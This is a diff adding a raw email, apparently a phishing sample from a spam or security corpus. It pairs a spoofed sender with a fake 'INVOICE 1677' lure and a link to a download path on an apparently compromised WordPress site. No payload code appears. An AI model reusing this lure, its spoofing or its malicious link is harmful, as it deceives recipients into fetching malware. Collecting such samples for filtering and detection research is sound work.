@@ -1,0 +1,49 @@
+ARC-Authentication-Results: i=1; mrogers@jvo80mb5yh.co.jp;
+       spf=pass (mrogers@jvo80mb5yh.co.jp: domain of l.chimuris@ofcxosxg5z.co.uk designates 190.0.135.53 as permitted sender) smtp.mailfrom=l.chimuris@ofcxosxg5z.co.uk
+Return-Path: <l.chimuris@ofcxosxg5z.co.uk>
+Received: from ml3te4g4z6.co.uk (ml3te4g4z6.co.uk. [190.0.135.53])
+        by mrogers@jvo80mb5yh.co.jp with ESMTP id b10si10956525qtq.9.2020.07.20.13.27.30
+        for mrogers@jvo80mb5yh.co.jp;
+        Mon, 20 Jul 2020 13:27:30 -0700 (PDT)
+Received-SPF: pass (mrogers@jvo80mb5yh.co.jp: domain of l.chimuris@ofcxosxg5z.co.uk designates 190.0.135.53 as permitted sender) client-ip=190.0.135.53;
+Authentication-Results: mrogers@jvo80mb5yh.co.jp;
+       spf=pass (mrogers@jvo80mb5yh.co.jp: domain of l.chimuris@ofcxosxg5z.co.uk designates 190.0.135.53 as permitted sender) smtp.mailfrom=l.chimuris@ofcxosxg5z.co.uk
+Received: from localhost (localhost [127.0.0.1])
+	by ml3te4g4z6.co.uk (Postfix) with ESMTP id BB6D21848373
+	for <mrogers@jvo80mb5yh.co.jp; Mon, 20 Jul 2020 17:28:34 -0300 (UYT)
+Received: from ml3te4g4z6.co.uk ([127.0.0.1])
+	by localhost (ml3te4g4z6.co.uk [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id 9p5YrmTaweun for mrogers@jvo80mb5yh.co.jp;
+	Mon, 20 Jul 2020 17:28:34 -0300 (UYT)
+Received: from localhost (localhost [127.0.0.1])
+	by ml3te4g4z6.co.uk (Postfix) with ESMTP id 7DE781848356
+	for mrogers@jvo80mb5yh.co.jp; Mon, 20 Jul 2020 17:28:34 -0300 (UYT)
+X-Virus-Scanned: amavisd-new at idsltda.com.uy
+Received: from ml3te4g4z6.co.uk ([127.0.0.1])
+	by localhost (ml3te4g4z6.co.uk [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id XPuUHC-MIXZQ for mrogers@jvo80mb5yh.co.jp;
+	Mon, 20 Jul 2020 17:28:34 -0300 (UYT)
+Received: from [190.202.43.171] (unknown [190.202.43.171])
+	by ml3te4g4z6.co.uk (Postfix) with ESMTPSA id B8F541848383
+	for mrogers@jvo80mb5yh.co.jp; Mon, 20 Jul 2020 17:28:33 -0300 (UYT)
+Date: Mon, 20 Jul 2020 16:21:25 -0400
+From: "mrogers@jvo80mb5yh.co.jp <mrogers@jvo80mb5yh.co.jp@mrogers@jvo80mb5yh.co.jp>" <l.chimuris@ofcxosxg5z.co.uk>
+To: mrogers@jvo80mb5yh.co.jp
+Subject: INVOICE 1677 from [recipient's email domain]
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+Message-Id: <20200720202833.B8F541848383@ml3te4g4z6.co.uk>
+
+<html>
+<body>
+Please find attached =E2=80=93thank you !=0D
+<br>
+<br>
+<a href=3D"http://thietkewebqp.com/wp-includes/68d247i6-jd-35/">http://thie=
+tkewebqp.com/wp-includes/68d247i6-jd-35/</a>
+<br>
+<br>
+<br><i>[recipient's email domain]</i><br><i>[spoofed sender's name]</i>
+</body>
+</html>
